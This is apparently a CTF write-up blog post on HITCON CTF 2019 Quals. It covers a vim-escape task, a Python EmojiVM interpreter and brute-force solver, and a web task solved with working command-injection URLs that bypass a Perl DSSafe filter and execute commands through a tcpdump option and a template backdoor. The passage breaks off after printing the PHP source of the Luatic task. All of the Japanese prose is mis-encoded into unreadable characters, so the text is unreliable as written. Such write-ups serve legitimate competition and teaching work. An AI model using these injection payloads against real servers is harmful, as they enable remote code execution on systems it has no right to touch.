---
layout: post
title: HITCON CTF 2019 Quals ã® write-up
categories: [ctf]
date: 2019-10-14 13:00:00 +0900
---

10 æœˆ 12 æ—¥ã‹ã‚‰ 10 æœˆ 14 æ—¥ã«ã‹ã‘ã¦é–‹å‚¬ã•ã‚ŒãŸ [HITCON CTF 2019 Quals](https://ctf.hitcon.org/) ã«ã€ãƒãƒ¼ãƒ  Harekaze ã¨ã—ã¦å‚åŠ ã—ã¾ã—ãŸã€‚æœ€çµ‚çš„ã«ãƒãƒ¼ãƒ ã§ 953 ç‚¹ã‚’ç²å¾—ã—ã€é †ä½ã¯å¾—ç‚¹ 662 ãƒãƒ¼ãƒ ä¸­ 64 ä½ã§ã—ãŸã€‚ã†ã¡ã€ç§ã¯ 4 å•ã‚’è§£ã„ã¦ 705 ç‚¹ã‚’å…¥ã‚Œã¾ã—ãŸã€‚

ä»¥ä¸‹ã€ç§ãŒè§£ã„ãŸå•é¡Œã® write-up ã§ã™ã€‚

## Misc
### Revenge of Welcome (105)
> It's an easy vim escape.
> 
> (SSH ã®æ¥ç¶šæƒ…å ±)

SSH ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã§å•é¡Œã‚µãƒ¼ãƒã«æ¥ç¶šã—ã¦ã¿ã‚‹ã¨ã€Vim ã®ç”»é¢ãŒè¡¨ç¤ºã•ã‚Œã¾ã—ãŸã€‚æŒ¿å…¥ãƒ¢ãƒ¼ãƒ‰ã«ãªã£ã¦ã„ã‚‹ã‚ˆã†ãªã®ã§ã€ã¨ã‚Šã‚ãˆãšãƒãƒ¼ãƒãƒ«ãƒ¢ãƒ¼ãƒ‰ã«ç§»è¡Œã™ã‚‹ãŸã‚ã« Esc ã‚­ãƒ¼ã‚’æŠ¼ã—ã¦ã¿ã¾ã—ãŸãŒã€ã™ãã«æŒ¿å…¥ãƒ¢ãƒ¼ãƒ‰ã«æˆ»ã£ã¦ã—ã¾ã„ã¾ã™ã€‚

æ§˜ã€…ãªã‚·ãƒ§ãƒ¼ãƒˆã‚«ãƒƒãƒˆã‚­ãƒ¼ã‚’è©¦ã—ã¦ã„ãŸã¨ã“ã‚ã€Ctrl-L ã‚’æŠ¼ã™ã“ã¨ã§ãªãœã‹ãƒãƒ¼ãƒãƒ«ãƒ¢ãƒ¼ãƒ‰ã«æˆ»ã‚‹ã“ã¨ãŒã§ãã¾ã—ãŸã€‚`:!ls` ã‚’å…¥åŠ›ã™ã‚‹ã¨ `flag` ã¨ã„ã†ãƒ•ã‚¡ã‚¤ãƒ«ã®å­˜åœ¨ãŒç¢ºèªã§ãã€`:!cat flag` ã§ãƒ•ãƒ©ã‚°ãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚

```
hitcon{accidentally enter vim -y and can't leave Q_Q}
```

## Reverse
### EmojiVM (187)
> A simple VM that takes emojis as input! Try figure out the secret!
> 
> æ·»ä»˜ãƒ•ã‚¡ã‚¤ãƒ«: emojivm-d967bd1b53b927820de27960f8eec7d7833150ca.zip

ä¸ãˆã‚‰ã‚ŒãŸ ZIP ãƒ•ã‚¡ã‚¤ãƒ«ã‚’å±•é–‹ã™ã‚‹ã¨ã€`emojivm_misc` `emojivm_pwn` `emojivm_reverse` ã¨ã„ã†ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãŒå‡ºã¦ãã¾ã—ãŸã€‚Misc ã‚«ãƒ†ã‚´ãƒªã¨ Pwn ã‚«ãƒ†ã‚´ãƒªã«ãã‚Œãã‚ŒåŒã˜åå‰ã®å•é¡ŒãŒã‚ã‚Šã¾ã™ãŒã€ä»Šå›ã¯ Reverse ã‚«ãƒ†ã‚´ãƒªãªã®ã§ `emojivm_reverse` ã‚’è¦‹ã¦ã„ãã¾ã™ã€‚

`emojivm_reverse` ã«ã¯ `chal.evm` (UTF-8 ã§ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸã€çµµæ–‡å­—ã®ã¿ãŒå«ã¾ã‚Œã‚‹ãƒ†ã‚­ã‚¹ãƒˆãƒ•ã‚¡ã‚¤ãƒ«)ã€`emojivm` (ELF)ã€`readme.txt` (`./emojivm ./chal.evm` ã¨ã„ã†å†…å®¹) ã® 3 ã¤ã®ãƒ•ã‚¡ã‚¤ãƒ«ãŒã‚ã‚Šã¾ã—ãŸã€‚`chal.evm` ã¯ `emojivm` ã¨ã„ã† VM ã§å®Ÿè¡ŒãŒã§ãã‚‹ãƒã‚¤ãƒˆã‚³ãƒ¼ãƒ‰åˆ—ã®ã‚ˆã†ã§ã™ã€‚

ç§ãŒå•é¡Œã‚’è¦‹ãŸæ™‚ç‚¹ã§æ—¢ã« [megumish](https://twitter.com/megumish) ã•ã‚“ã«ã‚ˆã£ã¦çµµæ–‡å­—ãŒæŒã¤æ„å‘³ (ã‚ªãƒšã‚³ãƒ¼ãƒ‰ãªã©) ãŒè§£æã•ã‚Œã¦ã„ãŸã®ã§ã€ã“ã®è§£æçµæœã‚’åˆ©ç”¨ã—ã¦ã¾ãš Python ã§ VM ã®å®Ÿè£…ã‚’ã—ã¾ã—ãŸã€‚

```python
# coding: utf-8
import sys

DEBUG = True

DIGITS = '\U0001f600\U0001f601\U0001f602\U0001f923\U0001f61c\U0001f604\U0001f605\U0001f606\U0001f609\U0001f60a\U0001f60d'
def read_int(program):
  return DIGITS.index(program.read(1))

def run(program, stack, memory):
  while True:
    c = program.read(1)
    if c == '':
      break

    if c == '\U0001f233': # 0x1,NOP
      pass
    elif c == '\U00002795': # 0x2,ADD
      stack.append(stack.pop() + stack.pop())
    elif c == '\U00002796': # 0x3,SUB
      stack.append(stack.pop() - stack.pop())
    elif c == '\U0000274c': # 0x4,MUL
      stack.append(stack.pop() * stack.pop())
    elif c == '\U00002753': # 0x5,MOD
      stack.append(stack.pop() % stack.pop())
    elif c == '\U0000274e': # 0x6,XOR
      stack.append(stack.pop() ^ stack.pop())
    elif c == '\U0001f46b': # 0x7,AND
      stack.append(stack.pop() & stack.pop())
    elif c == '\U0001f480': # 0x8,NEQ
      a, b = stack.pop(), stack.pop()
      stack.append(a != b)
    elif c == '\U0001f4af': # 0x9,EQ
      a, b = stack.pop(), stack.pop()
      if DEBUG:
        print('{:04x}: EQ {}, {}'.format(program.tell(), a, b))
      stack.append(a == b)
    elif c == '\U0001f680': # 0xa,GOTO
      program.seek(stack.pop())
    elif c == '\U0001f236': # 0xb,IF_TRUE_THEN_JUMP <op_pos> <cond>
      addr, cond = stack.pop(), stack.pop()
      if cond:
        program.seek(addr)
    elif c == '\U0001f21a': # 0xc,IF_FALSE_THEN_JUMP <op_pos> <cond>
      addr, cond = stack.pop(), stack.pop()
      if not cond:
        program.seek(addr)
    elif c == '\U000023ec': # 0xd,PUSH
      stack.append(read_int(program))
    elif c == '\U0001f51d': # 0xe,POP
      acc = stack.pop()
    elif c == '\U0001f4e4': # 0xf,LOAD
      addr, index = stack.pop(), stack.pop()
      stack.append(memory[addr][index])
    elif c == '\U0001f4e5': # 0x10,STORE
      addr, index, value = stack.pop(), stack.pop(), stack.pop()
      memory[addr][index] = value
    elif c == '\U0001f195': # 0x11,NEW
      memory.append([0] * stack.pop())
      stack.append(len(memory) - 1)
    elif c == '\U0001f193': # 0x12,FREE
      memory[stack.pop()] = None
    elif c == '\U0001f4c4': # 0x13,READ
      inp = input('').strip().encode() + b'\0'
      memory[stack.pop()] = inp
    elif c == '\U0001f4dd': # 0x14,WRITE
      s = bytes(memory[stack.pop()])
      sys.stdout.write(s[:s.index(b'\0')].decode('utf-8'))
    elif c == '\U0001f521': # 0x15,TO_STR
      # TODO
      pass
    elif c == '\U0001f522': # 0x16,TO_INT
      # TODO
      pass
    elif c == '\U0001f6d1': # 0x17,EXIT
      return

if __name__ == '__main__':
  import io

  if len(sys.argv) < 2:
    print('[usage] python {} <program>'.format(sys.argv[0]))
    sys.exit(1)

  with open(sys.argv[1], 'rb') as f:
    program = f.read().decode('utf-8')

  run(io.StringIO(program), [], [])
```

`EQ` ã¨ã„ã†ã‚ªãƒšã‚³ãƒ¼ãƒ‰ãŒæ¥ãŸã¨ãã«ã‚ªãƒšãƒ©ãƒ³ãƒ‰ã‚’å‡ºåŠ›ã™ã‚‹ã‚ˆã†ã«ã—ã¦ã„ã¾ã™ã€‚ã§ã¯ã€è©¦ã—ã«å®Ÿè¡Œã—ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

```
$ python3 vm.py chal.evm 
*************************************
*                                   *
*             Welcome to            *
*        EmojiVM ğŸ˜€ğŸ˜ğŸ¤£ğŸ¤”ğŸ¤¨ğŸ˜®       *
*       The Reverse Challenge       *
*                                   *
*************************************

Please input the secret: abcd
1aa9: EQ 0, 97
1ae1: EQ 10, 97
1aa9: EQ 0, 98
1ae1: EQ 10, 98
1aa9: EQ 0, 99
1ae1: EQ 10, 99
1aa9: EQ 0, 100
1ae1: EQ 10, 100
1aa9: EQ 0, 0
1b9a: EQ 24, 4
ğŸ˜­
$ python3 vm.py chal.evm 
*************************************
*                                   *
*             Welcome to            *
*        EmojiVM ğŸ˜€ğŸ˜ğŸ¤£ğŸ¤”ğŸ¤¨ğŸ˜®       *
*       The Reverse Challenge       *
*                                   *
*************************************

Please input the secret: abcde
1aa9: EQ 0, 97
1ae1: EQ 10, 97
1aa9: EQ 0, 98
1ae1: EQ 10, 98
1aa9: EQ 0, 99
1ae1: EQ 10, 99
1aa9: EQ 0, 100
1ae1: EQ 10, 100
1aa9: EQ 0, 101
1ae1: EQ 10, 101
1aa9: EQ 0, 0
1b9a: EQ 24, 5
ğŸ˜­
```

1 æ–‡å­—ãšã¤ `\0` ã‹ `\n` ã§ãªã„ã‹ãƒ«ãƒ¼ãƒ—ã§ãƒã‚§ãƒƒã‚¯ã—ãŸã‚ã¨ã€`24` ã¨å…¥åŠ›ã—ãŸæ–‡å­—æ•°ã‚’æ¯”è¼ƒã—ã¦ã„ã¾ã™ã€‚24 æ–‡å­—ã®æ–‡å­—åˆ—ã‚’å…¥åŠ›ã—ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

```
$ python3 vm.py chal.evm 
ï¸™
Please input the secret: abcdefghijklmnopqrstuvwx
ï¸™
1aa9: EQ 0, 120
1ae1: EQ 10, 120
1aa9: EQ 0, 0
1b9a: EQ 24, 24
1bdc: EQ 0, 1
1bdc: EQ 0, 2
1bdc: EQ 0, 3
1bdc: EQ 0, 4
1bdc: EQ 0, 0
1c8f: EQ 101, 45
```

`0x1b9a` ã®æ–‡å­—æ•°ãƒã‚§ãƒƒã‚¯ã‚ˆã‚Šå…ˆã«é€²ã‚€ã“ã¨ãŒã§ãã¾ã—ãŸã€‚å…¥åŠ›ã—ãŸæ–‡å­—åˆ—ã® 5 æ–‡å­—ç›®ã® `101` (ASCII ã‚³ãƒ¼ãƒ‰ã§ `e`) ã¨ `45` (`-`) ãŒæ¯”è¼ƒã•ã‚Œã¦ã„ã¾ã™ã€‚`e` ã‚’ `-` ã«å¤‰ãˆã¦ã‚‚ã†ä¸€åº¦è©¦ã—ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

```
$ python3 vm.py chal.evm 
ï¸™
Please input the secret: abcd-fghijklmnopqrstuvwx
ï¸™
1bdc: EQ 0, 1
1bdc: EQ 0, 2
1bdc: EQ 0, 3
1bdc: EQ 0, 4
1bdc: EQ 0, 0
1c8f: EQ 45, 45
1bdc: EQ 0, 1
1bdc: EQ 0, 2
1bdc: EQ 0, 3
1bdc: EQ 0, 4
1bdc: EQ 0, 0
1c8f: EQ 106, 45
```

ä»Šåº¦ã¯ 10 æ–‡å­—ç›®ã® `106` (`j`) ã¨ `45` (`-`) ãŒæ¯”è¼ƒã•ã‚Œã¦ã„ã¾ã™ã€‚ã“ã‚Œã‚’ç¹°ã‚Šè¿”ã—ã¦ã€`abcd-fghi-klmn-pqrs-uvwx` ã®ã‚ˆã†ã« 4 æ–‡å­—ã”ã¨ã« `-` ã‚’å…¥ã‚Œã‚‹ã“ã¨ã§ `0x1c8f` ã‚ˆã‚Šå…ˆã«é€²ã‚€ã“ã¨ãŒã§ãã¾ã—ãŸã€‚

```
$ python3 vm.py chal.evm 
ï¸™
Please input the secret: abcd-fghi-klmn-pqrs-uvwx
ï¸™
1faa: EQ 142, 127
1faa: EQ 99, 93
1faa: EQ 205, 199
1faa: EQ 18, 5
1faa: EQ 75, 75
ï¸™
20a4: EQ 24, -16
ğŸ˜­
$ python3 vm.py chal.evm 
ï¸™
Please input the secret: bbcd-fghi-klmn-pqrs-uvwx
ï¸™
1faa: EQ 142, 128
1faa: EQ 99, 93
1faa: EQ 205, 199
1faa: EQ 18, 5
1faa: EQ 75, 75
1faa: EQ 88, 89
ï¸™
20a4: EQ 24, -16
ğŸ˜­
```

1 æ–‡å­—ãšã¤ã€è¬ã®å‡¦ç†ãŒãªã•ã‚ŒãŸä¸Šã§è¬ã®ãƒã‚¤ãƒˆåˆ—ã¨æ¯”è¼ƒãŒã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã§ã™ã€‚1 æ–‡å­—ãšã¤ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã—ã¦ã€`EQ` ãŒ `True` ã«ãªã‚‹å›æ•°ãŒæœ€ã‚‚å¤šã„æ–‡å­—ãŒæ­£è§£ã§ã‚ã‚‹ã¨ã¿ãªã™ã¨ã„ã†ã‚½ãƒ«ãƒã‚’æ›¸ãã¾ã—ã‚‡ã†ã€‚

```python
# coding: utf-8
import re
import sys

DIGITS = '\U0001f600\U0001f601\U0001f602\U0001f923\U0001f61c\U0001f604\U0001f605\U0001f606\U0001f609\U0001f60a\U0001f60d'
def read_int(program):
  return DIGITS.index(program.read(1))

def run(program, stack, memory, inp):
  res = 0

  while True:
    c = program.read(1)
    if c == '':
      break

    if c == '\U0001f233': # 0x1,NOP
      pass
    elif c == '\U00002795': # 0x2,ADD
      stack.append(stack.pop() + stack.pop())
    elif c == '\U00002796': # 0x3,SUB
      stack.append(stack.pop() - stack.pop())
    elif c == '\U0000274c': # 0x4,MUL
      stack.append(stack.pop() * stack.pop())
    elif c == '\U00002753': # 0x5,MOD
      stack.append(stack.pop() % stack.pop())
    elif c == '\U0000274e': # 0x6,XOR
      stack.append(stack.pop() ^ stack.pop())
    elif c == '\U0001f46b': # 0x7,AND
      stack.append(stack.pop() & stack.pop())
    elif c == '\U0001f480': # 0x8,NEQ
      a, b = stack.pop(), stack.pop()
      stack.append(a != b)
    elif c == '\U0001f4af': # 0x9,EQ
      a, b = stack.pop(), stack.pop()
      if a == b:
        res += 1
      stack.append(a == b)
    elif c == '\U0001f680': # 0xa,GOTO
      program.seek(stack.pop())
    elif c == '\U0001f236': # 0xb,IF_TRUE_THEN_JUMP <op_pos> <cond>
      addr, cond = stack.pop(), stack.pop()
      if cond:
        program.seek(addr)
    elif c == '\U0001f21a': # 0xc,IF_FALSE_THEN_JUMP <op_pos> <cond>
      addr, cond = stack.pop(), stack.pop()
      if not cond:
        program.seek(addr)
    elif c == '\U000023ec': # 0xd,PUSH
      stack.append(read_int(program))
    elif c == '\U0001f51d': # 0xe,POP
      acc = stack.pop()
    elif c == '\U0001f4e4': # 0xf,LOAD
      addr, index = stack.pop(), stack.pop()
      stack.append(memory[addr][index])
    elif c == '\U0001f4e5': # 0x10,STORE
      addr, index, value = stack.pop(), stack.pop(), stack.pop()
      memory[addr][index] = value
    elif c == '\U0001f195': # 0x11,NEW
      memory.append([0] * stack.pop())
      stack.append(len(memory) - 1)
    elif c == '\U0001f193': # 0x12,FREE
      memory[stack.pop()] = None
    elif c == '\U0001f4c4': # 0x13,READ
      memory[stack.pop()] = inp.strip().encode() + b'\0'
    elif c == '\U0001f4dd': # 0x14,WRITE
      stack.pop()
    elif c == '\U0001f6d1': # 0x17,EXIT
      break

  return res

def hyphenize(s, x):
  t = (secret + c).ljust(x, 'A')
  return '-'.join(re.findall(r'.{4}', t))

if __name__ == '__main__':
  import io
  import string

  if len(sys.argv) < 2:
    print('[usage] python {} <program>'.format(sys.argv[0]))
    sys.exit(1)

  with open(sys.argv[1], 'rb') as f:
    program = f.read().decode('utf-8')
  
  secret = ''
  for _ in range(20):
    p = run(io.StringIO(program), [], [], 'AAAA-AAAA-AAAA-AAAA-AAAA'), 'A'

    for c in string.printable.strip():
      t = hyphenize((secret + c), 20)
      r = run(io.StringIO(program), [], [], t)
      if r > p[0]:
        p = r, c

    secret += p[1]
    print(hyphenize(secret, 20))
```

```
$ python3 solve.py chal.evm 
ï¸™
plis-g1v3-me33-th3e-f14g
$ python3 vm.py chal.evm 
*************************************
*                                   *
*             Welcome to            *
*        EmojiVM ğŸ˜€ğŸ˜ğŸ¤£ğŸ¤”ğŸ¤¨ğŸ˜®       *
*       The Reverse Challenge       *
*                                   *
*************************************

Please input the secret: plis-g1v3-me33-th3e-f14g
ğŸ˜
hitcon{R3vers3_Da_3moj1}
```

ãƒ•ãƒ©ã‚°ãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚

```
hitcon{R3vers3_Da_3moj1}
```

## ğŸŠ (Web)
### Virtual Public Network (183)
> Vulnerable Point of Your Network :)
>
> (URL)

ä¸ãˆã‚‰ã‚ŒãŸ URL ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ã€ä»¥ä¸‹ã®ã‚ˆã†ãªã‚³ãƒ¡ãƒ³ãƒˆãŒå«ã¾ã‚Œã‚‹ HTML ãŒè¿”ã£ã¦ãã¾ã—ãŸã€‚

```html
<!-- Hint for you :)
     <a href='diag.cgi'>diag.cgi</a>
     <a href='DSSafe.pm'>DSSafe.pm</a>  -->
```

`DSSafe.pm` ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ã€`__parsecmd` ã¨ã„ã†å¼•æ•°ãŒã‚³ãƒãƒ³ãƒ‰ãƒ©ã‚¤ãƒ³å¼•æ•°ã¨ã—ã¦å±é™ºãªã‚‚ã®ã‚’å«ã‚“ã§ã„ãªã„ã‹ãƒã‚§ãƒƒã‚¯ã™ã‚‹é–¢æ•°ã‚„ã€`__parsecmd` ãŒå¼•æ•°ã‚’å®‰å…¨ã§ã‚ã‚‹ã¨åˆ¤å®šã—ãŸå ´åˆã«ã®ã¿ã€OS ã‚³ãƒãƒ³ãƒ‰ã¨ã—ã¦å®Ÿè¡Œã™ã‚‹ `system` é–¢æ•°ãŒå®šç¾©ã•ã‚ŒãŸ Perl ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ãŒè¿”ã£ã¦ãã¾ã—ãŸã€‚

`diag.cgi` ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ä»¥ä¸‹ã®ã‚ˆã†ãª Perl ã‚³ãƒ¼ãƒ‰ãŒè¿”ã£ã¦ãã¾ã—ãŸã€‚

```perl
#!/usr/bin/perl
use lib '/var/www/html/';
use strict;

use CGI ();
use DSSafe;


sub tcpdump_options_syntax_check {
    my $options = shift;
    return $options if system("timeout -s 9 2 /usr/bin/tcpdump -d $options >/dev/null 2>&1") == 0;
    return undef;
}
 
print "Content-type: text/html\n\n";
 
my $options = CGI::param("options");
my $output = tcpdump_options_syntax_check($options);
 

# backdoor :)
my $tpl = CGI::param("tpl");
if (length $tpl > 0 && index($tpl, "..") == -1) {
    $tpl = "./tmp/" . $tpl . ".thtml";
    require($tpl);
}
```

`system("timeout -s 9 2 /usr/bin/tcpdump -d $options >/dev/null 2>&1")` ã®ã‚ˆã†ã«ãƒ¦ãƒ¼ã‚¶å…¥åŠ›ãŒãã®ã¾ã¾ OS ã‚³ãƒãƒ³ãƒ‰ã«å±•é–‹ã•ã‚Œã¦ã„ã‚‹ã®ã§ä½™è£•ãã†ã«è¦‹ãˆã¾ã™ãŒã€å‰è¿°ã®é€šã‚Š `system` ã¯ `__parsecmd` ã§å¼•æ•°ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ã„ã‚‹ãŸã‚ã€ä¾‹ãˆã° `a; curl (URL); #` ã®ã‚ˆã†ãªæ–‡å­—åˆ—ã‚’ GET ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã¨ã—ã¦ä¸ãˆã¦ã‚‚ `curl (URL)` ã‚’å®Ÿè¡Œã—ã¦ã¯ãã‚Œã¾ã›ã‚“ã€‚

ã„ã‚ã„ã‚ã‚°ã‚°ã£ã¦ã„ã‚‹ã¨ã€[Infiltrating Corporate Intranet Like NSA: Pre-Auth RCE on Leading SSL VPNs](https://hitcon.org/2019/CMT/slide-files/d1_s0_r0_keynote.pdf#page=83) ã¨ã„ã†ã€ã¾ã•ã« `DSSafe.pm` ã® `__parsecmd` ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹æ–¹æ³•ã‚’ç´¹ä»‹ã—ã¦ã„ã‚‹ã‚¹ãƒ©ã‚¤ãƒ‰ãŒè¦‹ã¤ã‹ã‚Šã¾ã—ãŸã€‚ãƒ¦ãƒ¼ã‚¶å…¥åŠ›ãŒå±•é–‹ã•ã‚Œã‚‹ç®‡æ‰€ã‚‚ `system("tcpdump -d $options >/dev/null 2>&1");` ã¨ã€ä»Šå›ã®å•é¡Œã¨ã»ã¨ã‚“ã©åŒã˜ã§ã™ã€‚

ã“ã®ã‚¹ãƒ©ã‚¤ãƒ‰ã‚’å‚è€ƒã«ã€ `/cgi-bin/diag.cgi?options=-r$x=%22ls%20-la%20/%22,system$x%23%202%3E./tmp/neko.thtml%20%3C%20` ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸå¾Œ `/cgi-bin/diag.cgi?tpl=neko` ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ã€ãƒ«ãƒ¼ãƒˆãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã« `FLAG` ã¨ã„ã† `root` ã ã‘ãŒèª­ã‚ãã†ãªãƒ•ã‚¡ã‚¤ãƒ«ã¨ã€å®Ÿè¡Œã™ã‚‹ã“ã¨ã§ã“ã‚Œã‚’èª­ã‚€ã“ã¨ãŒã§ããã†ãª `$READ_FLAG$` ã¨ã„ã†å®Ÿè¡Œãƒ•ã‚¡ã‚¤ãƒ«ãŒè¦‹ã¤ã‹ã‚Šã¾ã—ãŸã€‚

```
total 104
-rwsr-sr-x   1 root root  8520 Oct 11 23:57 $READ_FLAG$
drwxr-xr-x  23 root root  4096 Oct 12 00:00 .
drwxr-xr-x  23 root root  4096 Oct 12 00:00 ..
-r--------   1 root root    49 Oct 11 23:59 FLAG
drwxr-xr-x   2 root root  4096 Oct  2 17:11 bin
drwxr-xr-x   3 root root  4096 Oct  2 17:12 boot
drwxr-xr-x  15 root root  2980 Oct 11 19:41 dev
drwxr-xr-x  97 root root  4096 Oct 12 09:15 etc
drwxr-xr-x   4 root root  4096 Oct 11 17:21 home
lrwxrwxrwx   1 root root    31 Oct  2 17:12 initrd.img -> boot/initrd.img-4.15.0-1051-aws
lrwxrwxrwx   1 root root    31 Oct  2 17:12 initrd.img.old -> boot/initrd.img-4.15.0-1051-aws
drwxr-xr-x  20 root root  4096 Oct 11 22:11 lib
drwxr-xr-x   2 root root  4096 Oct  2 17:09 lib64
drwx------   2 root root 16384 Oct  2 17:11 lost+found
drwxr-xr-x   2 root root  4096 Oct  2 17:08 media
drwxr-xr-x   2 root root  4096 Oct  2 17:08 mnt
drwxr-xr-x   3 root root  4096 Oct 11 17:32 opt
dr-xr-xr-x 138 root root     0 Oct 11 19:41 proc
drwx------   5 root root  4096 Oct 12 09:16 root
drwxr-xr-x  25 root root   960 Oct 12 15:46 run
drwxr-xr-x   2 root root  4096 Oct  2 17:11 sbin
drwxr-xr-x   5 root root  4096 Oct 11 17:04 snap
drwxr-xr-x   2 root root  4096 Oct  2 17:08 srv
dr-xr-xr-x  13 root root     0 Oct 11 23:59 sys
drwxrwxrwt   3 root root  4096 Oct 12 17:57 tmp
drwxr-xr-x  10 root root  4096 Oct 11 21:45 usr
drwxr-xr-x  14 root root  4096 Oct 11 21:45 var
lrwxrwxrwx   1 root root    28 Oct  2 17:12 vmlinuz -> boot/vmlinuz-4.15.0-1051-aws
lrwxrwxrwx   1 root root    28 Oct  2 17:12 vmlinuz.old -> boot/vmlinuz-4.15.0-1051-aws
```

`"ls -la /"` ã‚’ `"/\$READ_FLAG\$"` ã«å¤‰ãˆã‚Œã°ã‚ˆã•ãã†ãªé›°å›²æ°—ãŒã‚ã‚Šã¾ã™ãŒã€`__parsecmd` ã«ã‚ˆã£ã¦ `$` ãªã©ã®æ–‡å­—ãŒåˆ¶é™ã•ã‚Œã¦ã—ã¾ã£ã¦ã„ã¾ã™ã€‚

`__parsecmd` ã«æ€’ã‚‰ã‚Œãªã„ç¯„å›²ã§ GET ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’ `eval` ã™ã‚‹ã‚ˆã†ã«ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’å¤‰ãˆã¦ã€`/$READ_FLAG$` ã‚’å®Ÿè¡Œã™ã‚‹ã¨ãƒ•ãƒ©ã‚°ãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚

```
/cgi-bin/diag.cgi?options=-r$x=%22eval%20CGI::param%20q!a!%22,eval$x%23%202%3E./tmp/neko.thtml%20%3C%20
â†’ /cgi-bin/diag.cgi?tpl=neko&a=print%20`/*READ_FLAG*`
```

```
hitcon{Now I'm sure u saw my Bl4ck H4t p4p3r :P}
```

### Luatic (230)
> Win the jackpot!
> 
> (URL)

ä¸ãˆã‚‰ã‚ŒãŸ URL ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã€`luatic` ã¨ã„ã†ãƒœã‚¿ãƒ³ã‚’æŠ¼ã™ã¨ä»¥ä¸‹ã®ã‚ˆã†ãªã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚

```php
<?php
    /* Author: Orange Tsai(@orange_8361) */
    include "config.php";

    foreach($_REQUEST as $k=>$v) {
        if( strlen($k) > 0 && preg_match('/^(FLAG|MY_|TEST_|GLOBALS)/i',$k)  )
            exit('Shame on you');
    }

    foreach(Array('_GET','_POST') as $request) {
        foreach($$request as $k => $v) ${$k} = str_replace(str_split("[]{}=.'\""), "", $v);
    }

    if (strlen($token) == 0) highlight_file(__FILE__) and exit();
    if (!preg_match('/^[a-f0-9-]{36}$/', $token)) die('Shame on you');

    $guess = (int)$guess;
    if ($guess == 0) die('Shame on you');

    // Check team token
    $status = check_team_redis_status($token);
    if ($status == "Invalid token") die('Invalid token');
    if (strlen($status) == 0 || $status == 'Stopped') die('Start Redis first');

    // Get team redis port
    $port = get_team_redis_port($token);
    if ((int)$port < 1024) die('Try again');
    
    // Connect, we rename insecure commands
    // rename-command CONFIG ""
    // rename-command SCRIPT ""
    // rename-command MODULE ""
    // rename-command SLAVEOF ""
    // rename-command REPLICAOF ""
    // rename-command SET $MY_SET_COMMAND
    $redis = new Redis();
    $redis->connect("127.0.0.1", $port);
    if (!$redis->auth($token)) die('Auth fail');

    // Check availability
    $redis->rawCommand($MY_SET_COMMAND, $TEST_KEY, $TEST_VALUE);
    if ($redis->get($TEST_KEY) !== $TEST_VALUE) die('Something Wrong?');

    // Lottery!
    $LUA_LOTTERY = "math.randomseed(ARGV[1]) for i=0, ARGV[2] do math.random() end return math.random(2^31-1)";
    $seed  = random_int(0, 0xffffffff / 2);
    $count = random_int(5, 10);
    $result = $redis->eval($LUA_LOTTERY, array($seed, $count));

    sleep(3); // Slow down...
    if ((int)$result === $guess)
        die("Congratulations, the flag is $FLAG");
    die(":(");
```

æœ€åˆã« `$_REQUEST` ã®ã‚­ãƒ¼ãŒ `FLAG` ã‚„ `TEST_` ãªã©ã§å§‹ã¾ã£ã¦ã„ãªã„ã‹ç¢ºèªã—ãŸå¾Œã€ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã«å«ã¾ã‚Œã‚‹ä¸€éƒ¨ã®æ–‡å­— (`[]{}=.'"`) ã‚’å‰Šé™¤ã—ãŸä¸Šã§ `extract($_REQUEST)` ã®ã‚ˆã†ãªæ„Ÿã˜ã§ GET ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãªã©ã‚’å¤‰æ•°ã¨ã—ã¦å±•é–‹ã—ã¦ã„ã¾ã™ã€‚

ãã®å¾Œãƒ¦ãƒ¼ã‚¶å…¥åŠ›ã¨ã—ã¦ä¸ãˆã‚‰ã‚ŒãŸ `$token` (ã‚¹ã‚³ã‚¢ã‚µãƒ¼ãƒã§äº‹å‰ã«ç™ºè¡Œã•ã‚ŒãŸã€ãƒãƒ¼ãƒ ã”ã¨ã«å›ºæœ‰ã®ãƒˆãƒ¼ã‚¯ãƒ³ãŒå…¥ã‚‹å¤‰æ•°) ã‚’ä½¿ã£ã¦ Redis ã‚µãƒ¼ãƒãŒç«‹ã¡ä¸ŠãŒã£ã¦ã„ã‚‹ã‹ãƒã‚§ãƒƒã‚¯ã—ã€ãƒãƒ¼ãƒˆç•ªå·ã‚’å–å¾—ã—ã¦æ¥ç¶šã—ã€ãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ã„ã¾ã™ã€‚æã‚‰ãã€ãƒãƒ¼ãƒ ã”ã¨ã«åˆ¥ã® Redis ã‚µãƒ¼ãƒã‚’ç”¨æ„ã—ã¦ã„ã‚‹ãŸã‚ã«ã“ã®ã‚ˆã†ãªå‡¦ç†ã‚’ã—ã¦ã„ã‚‹ã§ã—ã‚‡ã†ã€‚

